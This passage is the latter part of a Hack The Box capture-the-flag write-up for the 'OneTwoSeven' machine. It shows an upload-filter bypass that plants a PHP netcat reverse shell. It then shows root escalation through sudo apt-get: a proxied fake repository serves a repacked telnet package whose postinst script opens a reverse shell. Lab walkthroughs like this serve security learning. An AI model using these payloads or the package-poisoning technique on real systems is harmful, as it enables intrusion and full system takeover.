+<br /> First thing is the rewrite rules, any request sent to <code class="highlighter-rouge">addon-upload.php</code> and <code class="highlighter-rouge">addon-download.php</code> gets sent to <code class="highlighter-rouge">addons/ots-man-addon.php</code>. There’s also a small note that says “Disabling a feature through htaccess leads to 404 errors for now.”, This explains why we got 404 when attempting to upload a plugin, however the download feature isn’t disabled and I was able to download the <code class="highlighter-rouge">Addon manager</code> plugin :
+<img src="/images/hackthebox/onetwoseven/28.png" alt="" />
+<br /> Since both requests to <code class="highlighter-rouge">addon-upload.php</code> and <code class="highlighter-rouge">addon-download.php</code> go to <code class="highlighter-rouge">ots-man-addon.php</code>, we have to find a way to exploit <code class="highlighter-rouge">ots-man-addon.php</code> and just use <code class="highlighter-rouge">addon-download.php</code> because it’s not disabled. 
+<br /> <code class="highlighter-rouge">ots-man-addon.php</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
+# OneTwoSeven Admin Plugin
+# OTS Addon Manager
+switch (true) {
+	# Upload addon to addons folder.
+	case preg_match('/\/addon-upload.php/',$_SERVER['REQUEST_URI']):
+		if(isset($_FILES['addon'])){
+			$errors= array();
+			$file_name = basename($_FILES['addon']['name']);
+			$file_size =$_FILES['addon']['size'];
+			$file_tmp =$_FILES['addon']['tmp_name'];
+
+			if($file_size &gt; 20000){
+				$errors[]='Module too big for addon manager. Please upload manually.';
+			}
+
+			if(empty($errors)==true) {
+				move_uploaded_file($file_tmp,$file_name);
+				header("Location: /menu.php");
+				header("Content-Type: text/plain");
+				echo "File uploaded successfull.y";
+			} else {
+				header("Location: /menu.php");
+				header("Content-Type: text/plain");
+				echo "Error uploading the file: ";
+				print_r($errors);
+			}
+		}
+		break;
+	# Download addon from addons folder.
+	case preg_match('/\/addon-download.php/',$_SERVER['REQUEST_URI']):
+		if ($_GET['addon']) {
+			$addon_file = basename($_GET['addon']);
+			if ( file_exists($addon_file) ) {
+				header("Content-Disposition: attachment; filename=$addon_file");
+				header("Content-Type: text/plain");
+				readfile($addon_file);
+			} else {
+				header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
+				die();
+			}
+		}
+		break;
+	default:
+		echo "The addon manager must not be executed directly but only via&lt;br&gt;";
+		echo "the provided RewriteRules:&lt;br&gt;&lt;hr&gt;";
+		echo "RewriteEngine On&lt;br&gt;";
+		echo "RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]&lt;br&gt;";
+		echo "RewriteRule ^addon-download.php addons/ots-man-addon.php [L]&lt;br&gt;&lt;hr&gt;";
+		echo "By commenting individual RewriteRules you can disable single&lt;br&gt;";
+		echo "features (i.e. for security reasons)&lt;br&gt;&lt;br&gt;";
+		echo "&lt;font size='-2'&gt;Please note: Disabling a feature through htaccess leads to 404 errors for now.&lt;/font&gt;";
+		break;
+}
+?&gt;
+</code></pre></div></div>
+<p><br /> This part of the code tells us what we need to do :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	case preg_match('/\/addon-upload.php/',$_SERVER['REQUEST_URI']):
+		if(isset($_FILES['addon'])){
+			$errors= array();
+			$file_name = basename($_FILES['addon']['name']);
+			$file_size =$_FILES['addon']['size'];
+			$file_tmp =$_FILES['addon']['tmp_name'];
+
+			if($file_size &gt; 20000){
+				$errors[]='Module too big for addon manager. Please upload manually.';
+			}
+
+			if(empty($errors)==true) {
+				move_uploaded_file($file_tmp,$file_name);
+				header("Location: /menu.php");
+				header("Content-Type: text/plain");
+				echo "File uploaded successfull.y";
+</code></pre></div></div>
+<p><br /> We need to have <code class="highlighter-rouge">/addon-upload.php</code> in the request URI, we can’t request <code class="highlighter-rouge">/addon-upload.php</code> directly because it’s disabled but we can just put a useless <code class="highlighter-rouge">GET</code> parameter with the value <code class="highlighter-rouge">/addon-upload.php</code>,  and it will pass the check.
+<br /> It takes the addon name from the <code class="highlighter-rouge">GET</code> parameter <code class="highlighter-rouge">addon</code> so we have to add that parameter to the request URI.
+<br /> So the request URI looks like this :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/addon-download.php?addon=addons/rev.php&amp;test=/addon-upload.php
+</code></pre></div></div>
+<p><br /> Request :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /addon-download.php?addon=addons/rev.php&amp;test=/addon-upload.php HTTP/1.1
+Host: 127.0.0.1:60080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php
+Content-Type: multipart/form-data; boundary=---------------------------171386507112993851681929761040
+Content-Length: 326
+Cookie: PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+-----------------------------171386507112993851681929761040
+
+Content-Disposition: form-data; name="addon"; filename="rev.php"
+Content-Type: application/x-php
+
+&lt;?php
+system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f');
+?&gt;
+
+-----------------------------171386507112993851681929761040--
+</code></pre></div></div>
+<p><br /> Response :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 302 Found
+Date: Thu, 29 Aug 2019 20:56:24 GMT
+Server: Apache/2.4.25 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /menu.php
+Content-Length: 27
+Connection: close
+Content-Type: text/plain;charset=UTF-8
+
+
+File uploaded successfull.y
+</code></pre></div></div>
+<p><br /> Now if we check <code class="highlighter-rouge">/addons</code>, <code class="highlighter-rouge">rev.php</code> is there :
+<img src="/images/hackthebox/onetwoseven/29.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/onetwoseven/30.png" alt="" /></p>
+<hr />
+
+<h2 id="apt-mitm-root-flag">APT MITM, Root Flag</h2>
+<p><br /> As <code class="highlighter-rouge">www-admin-data</code>  we can run <code class="highlighter-rouge">apt-get update</code> and <code class="highlighter-rouge">apt-get upgrade</code> as root without a password :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ sudo -l
+Matching Defaults entries for www-admin-data on onetwoseven:
+    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
+    mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-admin-data may run the following commands on onetwoseven:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
+</code></pre></div></div>
+<p><br /> Also when using <code class="highlighter-rouge">sudo</code> it doesn’t reset these environment variables : <code class="highlighter-rouge">ftp_proxy</code>, <code class="highlighter-rouge">http_proxy</code>, <code class="highlighter-rouge">https_proxy</code>
+<br /> We can create a fake apt repository and add a malicious package that gives us code execution. Then we can run a proxy server (burp or anything else) and set the <code class="highlighter-rouge">http_proxy</code> variable to our server. After that we can make the proxy server use our fake repository instead of the real one by adding an entry in <code class="highlighter-rouge">/etc/hosts</code>. Finally when we run <code class="highlighter-rouge">apt-get update &amp;&amp; apt-get upgrade</code> it will attempt to install our malicious package that will give us a root shell. This <a href="https://versprite.com/blog/apt-mitm-package-injection/">article</a> was very helpful.
+<br /> Let’s check the sources that box is using first :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list
+# 
+
+# deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free
+
+#deb cdrom:[devuan_ascii_2.0.0_amd64_netinst]/ ascii main non-free
+
+deb http://de.deb.devuan.org/merged ascii main
+# deb-src http://de.deb.devuan.org/merged ascii main
+
+deb http://de.deb.devuan.org/merged ascii-security main
+# deb-src http://de.deb.devuan.org/merged ascii-security main
+
+deb http://de.deb.devuan.org/merged ascii-updates main
+# deb-src http://de.deb.devuan.org/merged ascii-updates main
+www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list 
+# OneTwoSeven special packages - not yet in use
+deb http://packages.onetwoseven.htb/devuan ascii main
+www-admin-data@onetwoseven:/$ 
+</code></pre></div></div>
+<p><br /> In <code class="highlighter-rouge">/etc/apt/sources.list.d/onetwoseven.list</code> there’s an entry for <code class="highlighter-rouge">packages.onetwoseven.htb</code>. Let’s use that.
+<br /> I started another burp listener on port 8181 :
+<img src="/images/hackthebox/onetwoseven/31.png" alt="" />
+<br /> And I added <code class="highlighter-rouge">packages.onetwoseven.htb</code> to my <code class="highlighter-rouge">hosts</code> file and made it point to my ip :
+<img src="/images/hackthebox/onetwoseven/32.png" alt="" />
+<br /> Now any request to <code class="highlighter-rouge">packages.onetwoseven.htb</code> through the proxy server will be sent to my ip. Now we need to create the fake repository and the malicious package.
+<br /> I chose <code class="highlighter-rouge">telnet</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ dpkg -l | grep telnet
+ii  telnet                                 0.17-41                            amd64        basic telnet client
+www-admin-data@onetwoseven:/$ apt-cache show telnet 
+Package: telnet
+Version: 0.17-41
+Installed-Size: 157
+Maintainer: Mats Erik Andersson &lt;mats.andersson@gisladisker.se&gt;
+Architecture: amd64
+Replaces: netstd
+Provides: telnet-client
+Depends: netbase, libc6 (&gt;= 2.15), libstdc++6 (&gt;= 5)
+Description: basic telnet client
+Description-md5: 80f238fa65c82c04a1590f2a062f47bb
+Source: netkit-telnet
+Tag: admin::login, interface::shell, network::client, protocol::ipv6,
+ protocol::telnet, role::program, uitoolkit::ncurses, use::login
+Section: net
+Priority: standard
+Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
+Size: 72008
+MD5sum: 3409d7e40403699b890c68323e200874
+SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae
+</code></pre></div></div>
+<p><br /> The version on the box is <code class="highlighter-rouge">0.17-41</code>, I searched for it and downloaded it :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# wget ftp.br.debian.org/debian/pool/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
+--2019-08-29 23:10:54--  http://ftp.br.debian.org/debian/pool/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
+Resolving ftp.br.debian.org (ftp.br.debian.org)... 200.236.31.3, 2801:82:80ff:8000::4
+Connecting to ftp.br.debian.org (ftp.br.debian.org)|200.236.31.3|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 72008 (70K) [application/x-debian-package]
+Saving to: ‘telnet_0.17-41_amd64.deb’
+
+telnet_0.17-41_amd64.deb                             100%[=====================================================================================================================&gt;]  70.32K   113KB/s    in 0.6s    
+
+2019-08-29 23:10:56 (113 KB/s) - ‘telnet_0.17-41_amd64.deb’ saved [72008/72008]
+
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# file telnet_0.17-41_amd64.deb 
+telnet_0.17-41_amd64.deb: Debian binary package (format 2.0)
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# 
+</code></pre></div></div>
+<p><br /> We will unpack it :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# dpkg-deb -R ./telnet_0.17-41_amd64.deb ./extract
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# ls -la ./extract/
+total 16
+drwxr-xr-x 4 root root 4096 Aug 29 23:12 .
+drwxr-xr-x 3 root root 4096 Aug 29 23:12 ..
+drwxr-xr-x 2 root root 4096 Nov  7  2016 DEBIAN
+drwxr-xr-x 4 root root 4096 Nov  7  2016 usr
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# 
+</code></pre></div></div>
+<p><br /> And add a reverse shell payload in the post install script :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/extract/DEBIAN# nano postinst
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/extract/DEBIAN# cat postinst
+#!/bin/sh
+# $Id: postinst,v 1.4 2000/08/23 10:08:42 herbert Exp $
+
+set -e
+
+update-alternatives --install /usr/bin/telnet telnet /usr/bin/telnet.netkit 100 \
+                    --slave /usr/share/man/man1/telnet.1.gz telnet.1.gz \
+                                /usr/share/man/man1/telnet.netkit.1.gz
+
+# Automatically added by dh_installmenu
+if [ "$1" = "configure" ] &amp;&amp; [ -x "`which update-menus 2&gt;/dev/null`" ]; then
+        update-menus
+fi
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1338 &gt;/tmp/f
+# End automatically added section
+
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/extract/DEBIAN# 
+</code></pre></div></div>
+<p><br /> Then we will pack it again and change the version number :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# dpkg-deb -b extract/ telnet_0.17-42_amd64.deb
+dpkg-deb: building package 'telnet' in 'telnet_0.17-42_amd64.deb'.
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# ls -la
+total 156
+drwxr-xr-x 3 root root  4096 Aug 29 23:18 .
+drwxr-xr-x 3 root root  4096 Aug 29 23:16 ..
+drwxr-xr-x 4 root root  4096 Aug 29 23:12 extract
+-rw-r--r-- 1 root root 72008 Nov 10  2016 telnet_0.17-41_amd64.deb
+-rw-r--r-- 1 root root 72176 Aug 29 23:18 telnet_0.17-42_amd64.deb
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# 
+</code></pre></div></div>
+<p><br /> What’s left is to create the repository, its name will be <code class="highlighter-rouge">devuan</code> as we saw in the sources list :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list 
+# OneTwoSeven special packages - not yet in use
+deb http://packages.onetwoseven.htb/devuan ascii main
+</code></pre></div></div>
+<p><br /> The path for the package will be :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb
+</code></pre></div></div>
+<p><br /> as we saw in the <code class="highlighter-rouge">apt-cache</code> result :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ apt-cache show telnet 
+Package: telnet
+Version: 0.17-41
+Installed-Size: 157
+Maintainer: Mats Erik Andersson &lt;mats.andersson@gisladisker.se&gt;
+Architecture: amd64
+Replaces: netstd
+Provides: telnet-client
+Depends: netbase, libc6 (&gt;= 2.15), libstdc++6 (&gt;= 5)
+Description: basic telnet client
+Description-md5: 80f238fa65c82c04a1590f2a062f47bb
+Source: netkit-telnet
+Tag: admin::login, interface::shell, network::client, protocol::ipv6,
+ protocol::telnet, role::program, uitoolkit::ncurses, use::login
+Section: net
+Priority: standard
+Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-41_amd64.deb
+Size: 72008
+MD5sum: 3409d7e40403699b890c68323e200874
+SHA256: 95aa315eb5b3be12fc7a91a8d7ee8eba7af99120641067ec39694200e034a5ae
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm# mkdir devuan &amp;&amp; cd $_
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan# mkdir pool &amp;&amp; cd $_
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool# mkdir DEBIAN &amp;&amp; cd $_
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN# mkdir main &amp;&amp; cd $_
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main# mkdir n &amp;&amp; cd $_
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n# mkdir netkit-telnet
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n# cd netkit-telnet/
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# cp ../../../../../../telnet_0.17-42_amd64.deb .
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# ls -la
+total 80
+drwxr-xr-x 2 root root  4096 Aug 29 23:24 .
+drwxr-xr-x 3 root root  4096 Aug 29 23:23 ..
+-rw-r--r-- 1 root root 72176 Aug 29 23:24 telnet_0.17-42_amd64.deb
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# 
+</code></pre></div></div>
+<p><br /> Now we need to create a <code class="highlighter-rouge">Packages</code> file, we’ll copy the stuff from <code class="highlighter-rouge">apt-cache show telnet</code> and change the version number, size and the hashes.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# ls -la
+total 80
+drwxr-xr-x 2 root root  4096 Aug 29 23:24 .
+drwxr-xr-x 3 root root  4096 Aug 29 23:23 ..
+-rw-r--r-- 1 root root 72176 Aug 29 23:24 telnet_0.17-42_amd64.deb
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# md5sum telnet_0.17-42_amd64.deb                                                                                       
+2d29b3d5179226f9a772e370c1df05d9  telnet_0.17-42_amd64.deb
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# sha256sum telnet_0.17-42_amd64.deb 
+77e432f0017f8a1a035468a7fd02749a0e253aa61417fe801205d03fc41bdacd  telnet_0.17-42_amd64.deb
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/pool/DEBIAN/main/n/netkit-telnet# 
+</code></pre></div></div>
+<p><br /> <code class="highlighter-rouge">Packages</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Package: telnet
+Version: 0.17-42
+Installed-Size: 157
+Maintainer: Mats Erik Andersson &lt;mats.andersson@gisladisker.se&gt;
+Architecture: amd64
+Replaces: netstd
+Provides: telnet-client
+Depends: netbase, libc6 (&gt;= 2.15), libstdc++6 (&gt;= 5)
+Description: basic telnet client
+Description-md5: 80f238fa65c82c04a1590f2a062f47bb
+Source: netkit-telnet
+Tag: admin::login, interface::shell, network::client, protocol::ipv6,
+ protocol::telnet, role::program, uitoolkit::ncurses, use::login
+Section: net
+Priority: standard
+Filename: pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb
+Size: 72176
+MD5sum: 2d29b3d5179226f9a772e370c1df05d9
+SHA256: 77e432f0017f8a1a035468a7fd02749a0e253aa61417fe801205d03fc41bdacd
+</code></pre></div></div>
+<p><br /> Path for the <code class="highlighter-rouge">Packages</code> file will be <code class="highlighter-rouge">dists/ascii/main/binary-amd64</code>, we know it’s <code class="highlighter-rouge">ascii/main</code> from the sources list :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list 
+# OneTwoSeven special packages - not yet in use
+deb http://packages.onetwoseven.htb/devuan ascii main
+</code></pre></div></div>
+<p><br /> And <code class="highlighter-rouge">binary-amd64</code> because the package’s architecture is <code class="highlighter-rouge">amd-64</code></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan# mkdir dists &amp;&amp; cd $_
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists# mkdir ascii &amp;&amp; cd $_
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii# mkdir main &amp;&amp; cd $_
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main# mkdir binary-amd64 &amp;&amp; cd $_
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main/binary-amd64# cp ../../../../../Packages .
+root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan/dists/ascii/main/binary-amd64# 
+</code></pre></div></div>
+<p><br /> And that’s it for the repository.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/onetwoseven/apt-mitm/devuan# tree
+.
+├── dists
+│   └── ascii
+│       └── main
+│           └── binary-amd64
+│               └── Packages
+└── pool
+    └── DEBIAN
+        └── main
+            └── n
+                └── netkit-telnet
+                    └── telnet_0.17-42_amd64.deb
+
+9 directories, 2 files
+</code></pre></div></div>
+<p><br /> What’s left is to run a python <code class="highlighter-rouge">http</code> server in <code class="highlighter-rouge">~/Desktop/HTB/boxes/onetwoseven/apt-mitm/</code> and everything is done.
+<br /> I exported the <code class="highlighter-rouge">http_proxy</code> variable and I ran <code class="highlighter-rouge">apt-get update</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ export http_proxy=http://10.10.xx.xx:8181/
+www-admin-data@onetwoseven:/$ sudo apt-get update
+</code></pre></div></div>
+<p><br /> Then I ran <code class="highlighter-rouge">apt-get upgrade</code> :
+<img src="/images/hackthebox/onetwoseven/33.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/onetwoseven/34.png" alt="" />
+<br /> And we owned root !
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></p>
+<hr />
+
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>other posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/pwn/collision/">
+            pwnable.kr - collision
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/unattended/">
+            Hack The Box - Unattended
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/helpline/">
+            Hack The Box - Helpline
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-3">binary-exploitation</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/exploit-development/" class="set-1">exploit development</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-5">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
+  <div class="wrapper"><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+if (theme === "dark") {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+} else if (theme === "light") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+} else if  (userPrefers === "dark") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'dark');
+	document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	window.localStorage.setItem('theme', 'dark');
+	document.getElementById("theme-toggle").className = 'light';
+} else {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'light');
+	document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	window.localStorage.setItem('theme', 'light');
+	document.getElementById("theme-toggle").className = 'dark';
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    document.documentElement.setAttribute('data-theme', 'light');
+		document.documentElement.classList.add('theme--light');
+        document.documentElement.classList.remove('theme--dark');
+		window.localStorage.setItem('theme', 'light');
+	    document.getElementById("theme-toggle").className = 'dark';
+	} else {
+	    document.documentElement.setAttribute('data-theme', 'dark');
+		document.documentElement.classList.add('theme--dark');
+        document.documentElement.classList.remove('theme--light');
+		window.localStorage.setItem('theme', 'dark');
+	    document.getElementById("theme-toggle").className = 'light';
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
